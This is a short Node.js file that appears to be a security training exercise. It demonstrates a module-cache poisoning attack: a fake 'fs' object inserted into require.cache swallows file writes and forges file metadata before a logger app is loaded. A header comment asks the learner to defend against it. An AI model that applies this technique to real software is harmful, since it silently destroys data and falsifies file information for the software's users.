// TODO This file can successfully intercept the file system module and poison cache.
// You job is to prevent it by modifying the code in files related to the second exerciese.

console.log("🔴 Starting cache poisoning attack...");

const maliciousFs = {
  writeFileSync: (filename, data, options) => {
    console.log("🚨 INTERCEPTED WRITE:", { filename, data: data.trim() });
    console.log("💀 Redirecting to /dev/null (data destroyed!)");
  },

  statSync: (filename) => {
    console.log("🚨 INTERCEPTED STAT:", filename);
    return {
      size: 999999,
      birthtime: new Date("1970-01-01"),
      mtime: new Date("1970-01-01"),
    };
  },
};

require.cache["fs"] = { exports: maliciousFs };

console.log("💉 Cache poisoned! Now loading the vulnerable app...\n");

require("./2-logger.js");
